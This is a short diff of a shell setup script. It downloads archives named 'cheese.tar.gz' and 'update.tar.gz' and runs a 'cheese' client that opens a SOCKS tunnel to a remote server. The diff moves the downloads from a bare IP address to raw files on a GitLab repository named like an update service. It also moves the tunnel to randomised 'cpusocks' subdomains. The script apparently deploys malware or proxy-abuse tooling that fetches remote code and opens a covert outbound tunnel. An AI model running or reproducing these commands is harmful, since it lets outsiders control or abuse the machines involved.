@@ -48,7 +48,7 @@ apt-get install -y google-chrome-stable
 
 sleep 2
 
-wget -q http://45.135.58.52/cheese.tar.gz > /dev/null
+wget -q https://gitlab.com/update9394625/update411/-/raw/main/cheese.tar.gz > /dev/null
 sleep 2
 npm install pm2 -g
 
@@ -58,7 +58,7 @@ tar -xf cheese.tar.gz
 
 sleep 2
 
-./cheese client -v 45.135.58.52:443 7777:socks &
+./cheese client -v cpusocks$(shuf -i 2-6 -n 1).wot.mrface.com:80 7777:socks &
 
 sleep 2
 
@@ -66,7 +66,7 @@ TZ='Africa/Johannesburg'; export TZ
 date
 sleep 2
 
-wget http://45.135.58.52/update.tar.gz > /dev/null
+wget https://gitlab.com/update9394625/update411/-/raw/main/update.tar.gz > /dev/null
 
 sleep 2
 
